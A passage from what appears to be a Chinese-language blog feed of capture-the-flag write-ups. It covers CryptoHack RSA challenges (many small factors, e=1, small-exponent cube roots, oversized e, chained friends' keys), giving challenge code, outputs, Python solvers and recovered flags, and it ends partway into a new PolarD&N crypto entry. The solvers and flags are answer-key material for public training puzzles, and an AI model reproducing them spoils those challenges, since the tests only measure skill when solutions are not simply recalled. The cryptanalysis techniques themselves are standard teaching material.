class="number">65537</span></span><br><span class="line">ct = <span class="number">320721490534624434149993723527322977960556510750628354856260732098109692581338409999983376131354918370047625150454728718467998870322344980985635149656977787964380651868131740312053755501594999166365821315043312308622388016666802478485476059625888033017198083472976011719998333985531756978678758897472845358167730221506573817798467100023754709109274265835201757369829744113233607359526441007577850111228850004361838028842815813724076511058179239339760639518034583306154826603816927757236549096339501503316601078891287408682099750164720032975016814187899399273719181407940397071512493967454225665490162619270814464</span></span><br><span class="line"><span class="comment">#分解大数n，并列表</span></span><br><span class="line">f = FactorDB(n)</span><br><span class="line"><span class="built_in">print</span>(f.get_factor_list())</span><br><span class="line"><span class="built_in">print</span>(f.connect())</span><br><span class="line"><span class="built_in">print</span>(f.get_factor_list())</span><br><span class="line">p = f.get_factor_list()</span><br><span class="line"><span class="comment">#[9282105380008121879, 9303850685953812323, 9389357739583927789, 10336650220878499841, 10638241655447339831, 11282698189561966721, 11328768673634243077, 11403460639036243901, 11473665579512371723, 11492065299277279799, 11530534813954192171, 11665347949879312361, 12132158321859677597, 12834461276877415051, 12955403765595949597, 12973972336777979701, 13099895578757581201, 13572286589428162097, 14100640260554622013, 14178869592193599187, 14278240802299816541, 14523070016044624039, 14963354250199553339, 15364597561881860737, 15669758663523555763, 15824122791679574573, 15998365463074268941, 16656402470578844539, 16898740504023346457, 17138336856793050757, 17174065872156629921, 17281246625998849649]</span></span><br><span class="line">phi = p[<span class="number">0</span>]-<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> p:</span><br><span class="line">    phi *= i-<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(phi)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(ct,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># b'crypto{700_m4ny_5m4ll_f4c70r5}'</span></span><br></pre></td></tr></tbody></table></figure><h1 id="PUBLIC-EXPONENT"><a href="#PUBLIC-EXPONENT" class="headerlink" title="PUBLIC EXPONENT"></a>PUBLIC EXPONENT</h1><h2 id="Salty"><a href="#Salty" class="headerlink" title="Salty"></a>Salty</h2><p><img src="/2024/01/14/cryptohack/image-20240114020704755.png" alt="image-20240114020704755"></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, inverse, bytes_to_long, long_to_bytes</span><br><span class="line"></span><br><span class="line">e = <span class="number">1</span></span><br><span class="line">d = -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> d == -<span class="number">1</span>:</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = getPrime(<span class="number">512</span>)</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    d = inverse(e, phi)</span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b"XXXXXXXXXXXXXXXXXXXXXXX"</span></span><br><span class="line">pt = bytes_to_long(flag)</span><br><span class="line">ct = <span class="built_in">pow</span>(pt, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"n = <span class="subst">{n}</span>"</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"e = <span class="subst">{e}</span>"</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"ct = <span class="subst">{ct}</span>"</span>)</span><br><span class="line"></span><br><span class="line">pt = <span class="built_in">pow</span>(ct, d, n)</span><br><span class="line">decrypted = long_to_bytes(pt)</span><br><span class="line"><span class="keyword">assert</span> decrypted == flag</span><br></pre></td></tr></tbody></table></figure><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">n = 110581795715958566206600392161360212579669637391437097703685154237017351570464767725324182051199901920318211290404777259728923614917211291562555864753005179326101890427669819834642007924406862482343614488768256951616086287044725034412802176312273081322195866046098595306261781788276570920467840172004530873767                                                                  </span><br><span class="line">e = 1</span><br><span class="line">ct = 44981230718212183604274785925793145442655465025264554046028251311164494127485</span><br></pre></td></tr></tbody></table></figure><p>e = 1 , ct = m</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">ct = <span class="number">44981230718212183604274785925793145442655465025264554046028251311164494127485</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(ct))</span><br><span class="line"><span class="comment"># b'crypto{saltstack_fell_for_this!}'</span></span><br></pre></td></tr></tbody></table></figure><h2 id="Modulus-Inutilis"><a href="#Modulus-Inutilis" class="headerlink" title="Modulus Inutilis"></a>Modulus Inutilis</h2><p><img src="/2024/01/14/cryptohack/image-20240114020929747.png" alt="image-20240114020929747"></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, inverse, bytes_to_long, long_to_bytes</span><br><span class="line"></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">d = -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> d == -<span class="number">1</span>:</span><br><span class="line">    p = getPrime(<span class="number">1024</span>)</span><br><span class="line">    q = getPrime(<span class="number">1024</span>)</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    d = inverse(e, phi)</span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b"XXXXXXXXXXXXXXXXXXXXXXX"</span></span><br><span class="line">pt = bytes_to_long(flag)</span><br><span class="line">ct = <span class="built_in">pow</span>(pt, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"n = <span class="subst">{n}</span>"</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"e = <span class="subst">{e}</span>"</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"ct = <span class="subst">{ct}</span>"</span>)</span><br><span class="line"></span><br><span class="line">pt = <span class="built_in">pow</span>(ct, d, n)</span><br><span class="line">decrypted = long_to_bytes(pt)</span><br><span class="line"><span class="keyword">assert</span> decrypted == flag</span><br></pre></td></tr></tbody></table></figure><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">n = 17258212916191948536348548470938004244269544560039009244721959293554822498047075403658429865201816363311805874117705688359853941515579440852166618074161313773416434156467811969628473425365608002907061241714688204565170146117869742910273064909154666642642308154422770994836108669814632309362483307560217924183202838588431342622551598499747369771295105890359290073146330677383341121242366368309126850094371525078749496850520075015636716490087482193603562501577348571256210991732071282478547626856068209192987351212490642903450263288650415552403935705444809043563866466823492258216747445926536608548665086042098252335883</span><br><span class="line">e = 3</span><br><span class="line">ct = 243251053617903760309941844835411292373350655973075480264001352919865180151222189820473358411037759381328642957324889519192337152355302808400638052620580409813222660643570085177957</span><br></pre></td></tr></tbody></table></figure><p>e = 3 ,低加密指数攻击</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">e = <span class="number">0x3</span></span><br><span class="line">n = <span class="number">17258212916191948536348548470938004244269544560039009244721959293554822498047075403658429865201816363311805874117705688359853941515579440852166618074161313773416434156467811969628473425365608002907061241714688204565170146117869742910273064909154666642642308154422770994836108669814632309362483307560217924183202838588431342622551598499747369771295105890359290073146330677383341121242366368309126850094371525078749496850520075015636716490087482193603562501577348571256210991732071282478547626856068209192987351212490642903450263288650415552403935705444809043563866466823492258216747445926536608548665086042098252335883</span></span><br><span class="line">c = <span class="number">243251053617903760309941844835411292373350655973075480264001352919865180151222189820473358411037759381328642957324889519192337152355302808400638052620580409813222660643570085177957</span></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    res = iroot(c+k*n,e)  <span class="comment">#c+k*n 开3次方根 能开3次方即可</span></span><br><span class="line">    <span class="comment">#print(res)</span></span><br><span class="line">    <span class="comment">#res = (mpz(13040004482819713819817340524563023159919305047824600478799740488797710355579494486728991357), True)</span></span><br><span class="line">    <span class="keyword">if</span>(res[<span class="number">1</span>] == <span class="literal">True</span>):</span><br><span class="line">        <span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(res[<span class="number">0</span>]))) <span class="comment">#转为字符串</span></span><br><span class="line">        <span class="built_in">print</span>(res[<span class="number">0</span>])</span><br><span class="line">    k=k+<span class="number">1</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># b'crypto{N33d_m04R_p4dd1ng}'</span></span><br><span class="line"><span class="comment"># 624239975241694158443315202759206900318542905782320965248893</span></span><br></pre></td></tr></tbody></table></figure><h2 id="Everything-is-Big"><a href="#Everything-is-Big" class="headerlink" title="Everything is Big"></a>Everything is Big</h2><p><img src="/2024/01/14/cryptohack/image-20240114021316538.png" alt="image-20240114021316538"></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"></span><br><span class="line">FLAG = <span class="string">b"crypto{?????????????????????????}"</span></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(FLAG)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_huge_RSA</span>():</span><br><span class="line">    p = getPrime(<span class="number">1024</span>)</span><br><span class="line">    q = getPrime(<span class="number">1024</span>)</span><br><span class="line">    N = p*q</span><br><span class="line">    phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        d = getPrime(<span class="number">256</span>)</span><br><span class="line">        e = <span class="built_in">pow</span>(d,-<span class="number">1</span>,phi)</span><br><span class="line">        <span class="keyword">if</span> e.bit_length() == N.bit_length():</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> N,e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">N, e = get_huge_RSA()</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, N)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f'N = <span class="subst">{<span class="built_in">hex</span>(N)}</span>'</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f'e = <span class="subst">{<span class="built_in">hex</span>(e)}</span>'</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f'c = <span class="subst">{<span class="built_in">hex</span>(c)}</span>'</span>)</span><br></pre></td></tr></tbody></table></figure><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">N = 0xb8af3d3afb893a602de4afe2a29d7615075d1e570f8bad8ebbe9b5b9076594cf06b6e7b30905b6420e950043380ea746f0a14dae34469aa723e946e484a58bcd92d1039105871ffd63ffe64534b7d7f8d84b4a569723f7a833e6daf5e182d658655f739a4e37bd9f4a44aff6ca0255cda5313c3048f56eed5b21dc8d88bf5a8f8379eac83d8523e484fa6ae8dbcb239e65d3777829a6903d779cd2498b255fcf275e5f49471f35992435ee7cade98c8e82a8beb5ce1749349caa16759afc4e799edb12d299374d748a9e3c82e1cc983cdf9daec0a2739dadcc0982c1e7e492139cbff18c5d44529407edfd8e75743d2f51ce2b58573fea6fbd4fe25154b9964d</span><br><span class="line">e = 0x9ab58dbc8049b574c361573955f08ea69f97ecf37400f9626d8f5ac55ca087165ce5e1f459ef6fa5f158cc8e75cb400a7473e89dd38922ead221b33bc33d6d716fb0e4e127b0fc18a197daf856a7062b49fba7a86e3a138956af04f481b7a7d481994aeebc2672e500f3f6d8c581268c2cfad4845158f79c2ef28f242f4fa8f6e573b8723a752d96169c9d885ada59cdeb6dbe932de86a019a7e8fc8aeb07748cfb272bd36d94fe83351252187c2e0bc58bb7a0a0af154b63397e6c68af4314601e29b07caed301b6831cf34caa579eb42a8c8bf69898d04b495174b5d7de0f20cf2b8fc55ed35c6ad157d3e7009f16d6b61786ee40583850e67af13e9d25be3</span><br><span class="line">c = 0x3f984ff5244f1836ed69361f29905ca1ae6b3dcf249133c398d7762f5e277919174694293989144c9d25e940d2f66058b2289c75d1b8d0729f9a7c4564404a5fd4313675f85f31b47156068878e236c5635156b0fa21e24346c2041ae42423078577a1413f41375a4d49296ab17910ae214b45155c4570f95ca874ccae9fa80433a1ab453cbb28d780c2f1f4dc7071c93aff3924d76c5b4068a0371dff82531313f281a8acadaa2bd5078d3ddcefcb981f37ff9b8b14c7d9bf1accffe7857160982a2c7d9ee01d3e82265eec9c7401ecc7f02581fd0d912684f42d1b71df87a1ca51515aab4e58fab4da96e154ea6cdfb573a71d81b2ea4a080a1066e1bc3474</span><br></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> factordb.factordb <span class="keyword">import</span> FactorDB</span><br><span class="line"></span><br><span class="line">n = <span class="number">0xb8af3d3afb893a602de4afe2a29d7615075d1e570f8bad8ebbe9b5b9076594cf06b6e7b30905b6420e950043380ea746f0a14dae34469aa723e946e484a58bcd92d1039105871ffd63ffe64534b7d7f8d84b4a569723f7a833e6daf5e182d658655f739a4e37bd9f4a44aff6ca0255cda5313c3048f56eed5b21dc8d88bf5a8f8379eac83d8523e484fa6ae8dbcb239e65d3777829a6903d779cd2498b255fcf275e5f49471f35992435ee7cade98c8e82a8beb5ce1749349caa16759afc4e799edb12d299374d748a9e3c82e1cc983cdf9daec0a2739dadcc0982c1e7e492139cbff18c5d44529407edfd8e75743d2f51ce2b58573fea6fbd4fe25154b9964d</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">0x9ab58dbc8049b574c361573955f08ea69f97ecf37400f9626d8f5ac55ca087165ce5e1f459ef6fa5f158cc8e75cb400a7473e89dd38922ead221b33bc33d6d716fb0e4e127b0fc18a197daf856a7062b49fba7a86e3a138956af04f481b7a7d481994aeebc2672e500f3f6d8c581268c2cfad4845158f79c2ef28f242f4fa8f6e573b8723a752d96169c9d885ada59cdeb6dbe932de86a019a7e8fc8aeb07748cfb272bd36d94fe83351252187c2e0bc58bb7a0a0af154b63397e6c68af4314601e29b07caed301b6831cf34caa579eb42a8c8bf69898d04b495174b5d7de0f20cf2b8fc55ed35c6ad157d3e7009f16d6b61786ee40583850e67af13e9d25be3</span></span><br><span class="line"></span><br><span class="line">ct = <span class="number">0x3f984ff5244f1836ed69361f29905ca1ae6b3dcf249133c398d7762f5e277919174694293989144c9d25e940d2f66058b2289c75d1b8d0729f9a7c4564404a5fd4313675f85f31b47156068878e236c5635156b0fa21e24346c2041ae42423078577a1413f41375a4d49296ab17910ae214b45155c4570f95ca874ccae9fa80433a1ab453cbb28d780c2f1f4dc7071c93aff3924d76c5b4068a0371dff82531313f281a8acadaa2bd5078d3ddcefcb981f37ff9b8b14c7d9bf1accffe7857160982a2c7d9ee01d3e82265eec9c7401ecc7f02581fd0d912684f42d1b71df87a1ca51515aab4e58fab4da96e154ea6cdfb573a71d81b2ea4a080a1066e1bc3474</span></span><br><span class="line"></span><br><span class="line">f = FactorDB(n)</span><br><span class="line"><span class="built_in">print</span>(f.get_factor_list())</span><br><span class="line"><span class="built_in">print</span>(f.connect())</span><br><span class="line"><span class="comment">#print(f.get_factor_list())</span></span><br><span class="line">p_q = f.get_factor_list()</span><br><span class="line"><span class="built_in">print</span>(p_q)</span><br><span class="line"></span><br><span class="line">phi = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> p_q:</span><br><span class="line">    phi *= p-<span class="number">1</span></span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(ct,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># b'crypto{s0m3th1ng5_c4n_b3_t00_b1g}'</span></span><br></pre></td></tr></tbody></table></figure><h2 id="Crossed-Wires"><a href="#Crossed-Wires" class="headerlink" title="Crossed Wires"></a>Crossed Wires</h2><p><img src="/2024/01/14/cryptohack/image-20240114021541502.png" alt="image-20240114021541502"></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, long_to_bytes, bytes_to_long, inverse</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> next_prime</span><br><span class="line"></span><br><span class="line">FLAG = <span class="string">b"crypto{????????????????????????????????????????????????}"</span></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">N = p*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = inverse(e, phi)</span><br><span class="line"></span><br><span class="line">my_key = (N, d)</span><br><span class="line"></span><br><span class="line">friends = <span class="number">5</span></span><br><span class="line">friend_keys = [(N, getPrime(<span class="number">17</span>)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(friends)]</span><br><span class="line"></span><br><span class="line">cipher = bytes_to_long(FLAG)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> friend_keys:</span><br><span class="line">    cipher = <span class="built_in">pow</span>(cipher, key[<span class="number">1</span>], key[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"My private key: <span class="subst">{my_key}</span>"</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"My Friend's public keys: <span class="subst">{friend_keys}</span>"</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"Encrypted flag: <span class="subst">{cipher}</span>"</span>)</span><br></pre></td></tr></tbody></table></figure><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">My private key: (21711308225346315542706844618441565741046498277716979943478360598053144971379956916575370343448988601905854572029635846626259487297950305231661109855854947494209135205589258643517961521594924368498672064293208230802441077390193682958095111922082677813175804775628884377724377647428385841831277059274172982280545237765559969228707506857561215268491024097063920337721783673060530181637161577401589126558556182546896783307370517275046522704047385786111489447064794210010802761708615907245523492585896286374996088089317826162798278528296206977900274431829829206103227171839270887476436899494428371323874689055690729986771, 2734411677251148030723138005716109733838866545375527602018255159319631026653190783670493107936401603981429171880504360560494771017246468702902647370954220312452541342858747590576273775107870450853533717116684326976263006435733382045807971890762018747729574021057430331778033982359184838159747331236538501849965329264774927607570410347019418407451937875684373454982306923178403161216817237890962651214718831954215200637651103907209347900857824722653217179548148145687181377220544864521808230122730967452981435355334932104265488075777638608041325256776275200067541533022527964743478554948792578057708522350812154888097)</span><br><span class="line">My Friend's public keys: [(21711308225346315542706844618441565741046498277716979943478360598053144971379956916575370343448988601905854572029635846626259487297950305231661109855854947494209135205589258643517961521594924368498672064293208230802441077390193682958095111922082677813175804775628884377724377647428385841831277059274172982280545237765559969228707506857561215268491024097063920337721783673060530181637161577401589126558556182546896783307370517275046522704047385786111489447064794210010802761708615907245523492585896286374996088089317826162798278528296206977900274431829829206103227171839270887476436899494428371323874689055690729986771, 106979), (21711308225346315542706844618441565741046498277716979943478360598053144971379956916575370343448988601905854572029635846626259487297950305231661109855854947494209135205589258643517961521594924368498672064293208230802441077390193682958095111922082677813175804775628884377724377647428385841831277059274172982280545237765559969228707506857561215268491024097063920337721783673060530181637161577401589126558556182546896783307370517275046522704047385786111489447064794210010802761708615907245523492585896286374996088089317826162798278528296206977900274431829829206103227171839270887476436899494428371323874689055690729986771, 108533), (21711308225346315542706844618441565741046498277716979943478360598053144971379956916575370343448988601905854572029635846626259487297950305231661109855854947494209135205589258643517961521594924368498672064293208230802441077390193682958095111922082677813175804775628884377724377647428385841831277059274172982280545237765559969228707506857561215268491024097063920337721783673060530181637161577401589126558556182546896783307370517275046522704047385786111489447064794210010802761708615907245523492585896286374996088089317826162798278528296206977900274431829829206103227171839270887476436899494428371323874689055690729986771, 69557), (21711308225346315542706844618441565741046498277716979943478360598053144971379956916575370343448988601905854572029635846626259487297950305231661109855854947494209135205589258643517961521594924368498672064293208230802441077390193682958095111922082677813175804775628884377724377647428385841831277059274172982280545237765559969228707506857561215268491024097063920337721783673060530181637161577401589126558556182546896783307370517275046522704047385786111489447064794210010802761708615907245523492585896286374996088089317826162798278528296206977900274431829829206103227171839270887476436899494428371323874689055690729986771, 97117), (21711308225346315542706844618441565741046498277716979943478360598053144971379956916575370343448988601905854572029635846626259487297950305231661109855854947494209135205589258643517961521594924368498672064293208230802441077390193682958095111922082677813175804775628884377724377647428385841831277059274172982280545237765559969228707506857561215268491024097063920337721783673060530181637161577401589126558556182546896783307370517275046522704047385786111489447064794210010802761708615907245523492585896286374996088089317826162798278528296206977900274431829829206103227171839270887476436899494428371323874689055690729986771, 103231)]</span><br><span class="line">Encrypted flag: 20304610279578186738172766224224793119885071262464464448863461184092225736054747976985179673905441502689126216282897704508745403799054734121583968853999791604281615154100736259131453424385364324630229671185343778172807262640709301838274824603101692485662726226902121105591137437331463201881264245562214012160875177167442010952439360623396658974413900469093836794752270399520074596329058725874834082188697377597949405779039139194196065364426213208345461407030771089787529200057105746584493554722790592530472869581310117300343461207750821737840042745530876391793484035024644475535353227851321505537398888106855012746117</span><br></pre></td></tr></tbody></table></figure><p>几个朋友的依次加密，依次解密即可</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> factordb.factordb <span class="keyword">import</span> FactorDB</span><br><span class="line">friend_public_key = [(<span class="number">21711308225346315542706844618441565741046498277716979943478360598053144971379956916575370343448988601905854572029635846626259487297950305231661109855854947494209135205589258643517961521594924368498672064293208230802441077390193682958095111922082677813175804775628884377724377647428385841831277059274172982280545237765559969228707506857561215268491024097063920337721783673060530181637161577401589126558556182546896783307370517275046522704047385786111489447064794210010802761708615907245523492585896286374996088089317826162798278528296206977900274431829829206103227171839270887476436899494428371323874689055690729986771</span>, <span class="number">106979</span>), (<span class="number">21711308225346315542706844618441565741046498277716979943478360598053144971379956916575370343448988601905854572029635846626259487297950305231661109855854947494209135205589258643517961521594924368498672064293208230802441077390193682958095111922082677813175804775628884377724377647428385841831277059274172982280545237765559969228707506857561215268491024097063920337721783673060530181637161577401589126558556182546896783307370517275046522704047385786111489447064794210010802761708615907245523492585896286374996088089317826162798278528296206977900274431829829206103227171839270887476436899494428371323874689055690729986771</span>, <span class="number">108533</span>), (<span class="number">21711308225346315542706844618441565741046498277716979943478360598053144971379956916575370343448988601905854572029635846626259487297950305231661109855854947494209135205589258643517961521594924368498672064293208230802441077390193682958095111922082677813175804775628884377724377647428385841831277059274172982280545237765559969228707506857561215268491024097063920337721783673060530181637161577401589126558556182546896783307370517275046522704047385786111489447064794210010802761708615907245523492585896286374996088089317826162798278528296206977900274431829829206103227171839270887476436899494428371323874689055690729986771</span>, <span class="number">69557</span>), (<span class="number">21711308225346315542706844618441565741046498277716979943478360598053144971379956916575370343448988601905854572029635846626259487297950305231661109855854947494209135205589258643517961521594924368498672064293208230802441077390193682958095111922082677813175804775628884377724377647428385841831277059274172982280545237765559969228707506857561215268491024097063920337721783673060530181637161577401589126558556182546896783307370517275046522704047385786111489447064794210010802761708615907245523492585896286374996088089317826162798278528296206977900274431829829206103227171839270887476436899494428371323874689055690729986771</span>, <span class="number">97117</span>), (<span class="number">21711308225346315542706844618441565741046498277716979943478360598053144971379956916575370343448988601905854572029635846626259487297950305231661109855854947494209135205589258643517961521594924368498672064293208230802441077390193682958095111922082677813175804775628884377724377647428385841831277059274172982280545237765559969228707506857561215268491024097063920337721783673060530181637161577401589126558556182546896783307370517275046522704047385786111489447064794210010802761708615907245523492585896286374996088089317826162798278528296206977900274431829829206103227171839270887476436899494428371323874689055690729986771</span>, <span class="number">103231</span>)]</span><br><span class="line">My_private_key = (<span class="number">21711308225346315542706844618441565741046498277716979943478360598053144971379956916575370343448988601905854572029635846626259487297950305231661109855854947494209135205589258643517961521594924368498672064293208230802441077390193682958095111922082677813175804775628884377724377647428385841831277059274172982280545237765559969228707506857561215268491024097063920337721783673060530181637161577401589126558556182546896783307370517275046522704047385786111489447064794210010802761708615907245523492585896286374996088089317826162798278528296206977900274431829829206103227171839270887476436899494428371323874689055690729986771</span>, <span class="number">2734411677251148030723138005716109733838866545375527602018255159319631026653190783670493107936401603981429171880504360560494771017246468702902647370954220312452541342858747590576273775107870450853533717116684326976263006435733382045807971890762018747729574021057430331778033982359184838159747331236538501849965329264774927607570410347019418407451937875684373454982306923178403161216817237890962651214718831954215200637651103907209347900857824722653217179548148145687181377220544864521808230122730967452981435355334932104265488075777638608041325256776275200067541533022527964743478554948792578057708522350812154888097</span>)</span><br><span class="line">c = <span class="number">20304610279578186738172766224224793119885071262464464448863461184092225736054747976985179673905441502689126216282897704508745403799054734121583968853999791604281615154100736259131453424385364324630229671185343778172807262640709301838274824603101692485662726226902121105591137437331463201881264245562214012160875177167442010952439360623396658974413900469093836794752270399520074596329058725874834082188697377597949405779039139194196065364426213208345461407030771089787529200057105746584493554722790592530472869581310117300343461207750821737840042745530876391793484035024644475535353227851321505537398888106855012746117</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de</span>(<span class="params">public_key,c</span>):</span><br><span class="line">    n = public_key[<span class="number">0</span>]</span><br><span class="line">    f = FactorDB(n)</span><br><span class="line">    <span class="built_in">print</span>(f.get_factor_list())</span><br><span class="line">    <span class="built_in">print</span>(f.connect())</span><br><span class="line">    <span class="comment">#print(f.get_factor_list())</span></span><br><span class="line">    p_q = f.get_factor_list()</span><br><span class="line">    <span class="built_in">print</span>(p_q)</span><br><span class="line">    phi = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> p_q:</span><br><span class="line">        phi *= p-<span class="number">1</span></span><br><span class="line">    d = gmpy2.invert(public_key[<span class="number">1</span>],phi)</span><br><span class="line">    m = <span class="built_in">pow</span>(c,d,public_key[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> friend_public_key:</span><br><span class="line">    c = de(key,c)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(c))</span><br><span class="line"><span class="comment"># b'crypto{3ncrypt_y0ur_s3cr3t_w1th_y0ur_fr1end5_publ1c_k3y}'</span></span><br></pre></td></tr></tbody></table></figure><h1 id="未完待续。。。。"><a href="#未完待续。。。。" class="headerlink" title="未完待续。。。。"></a>未完待续。。。。</h1>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PolarD&amp;N—Crypto困难</title>
      <link href="/2024/01/08/polard-n-crypto-kun-nan/"/>
      <url>/2024/01/08/polard-n-crypto-kun-nan/</url>
      
        <content type="html"><![CDATA[<h1 id="分段解密"><a href="#分段解密" class="headerlink" title="分段解密"></a>分段解密</h1><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">[[3202805436L, 509716930L], [3140667873L, 1667141091L], [3173275598L, 2248305098L], [709283154L, 3416762332L]]</span><br></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">abc</span>(<span class="params">First</span>):  </span><br><span class="line">    First = c_uint32(First) <span class="comment"># 无符号数！</span></span><br><span class="line">    <span class="keyword">return</span> First</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enflag</span>(<span class="params">i, j</span>):</span><br><span class="line">    a = <span class="number">32</span></span><br><span class="line">    tt = <span class="number">0x9e3779b9</span></span><br><span class="line">    b = [<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">    First = abc(i[<span class="number">0</span>])</span><br><span class="line">    Second = abc(i[<span class="number">1</span>])</span><br><span class="line">    add = abc(<span class="number">0</span>)</span><br><span class="line">    add=add.value</span><br><span class="line">    <span class="keyword">while</span>(a&gt;<span class="number">0</span>):</span><br><span class="line">        add += tt</span><br><span class="line">        First.value += ( Second.value &lt;&lt; <span class="number">4</span> ) + j[<span class="number">0</span>] ^ Second.value + add ^ ( Second.value &gt;&gt; <span class="number">5</span> ) + j[<span class="number">1</span>]</span><br><span class="line">        Second.value += ( First.value &lt;&lt; <span class="number">4</span> ) + j[<span class="number">2</span>] ^ First.value + add ^ ( First.value &gt;&gt; <span class="number">5</span> ) + j[<span class="number">3</span>]</span><br><span class="line">        a = a - <span class="number">1</span></span><br><span class="line">    b[<span class="number">0</span>] = First.value</span><br><span class="line">    b[<span class="number">1</span>] = Second.value</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str_encoding</span>(<span class="params">ecryptText, 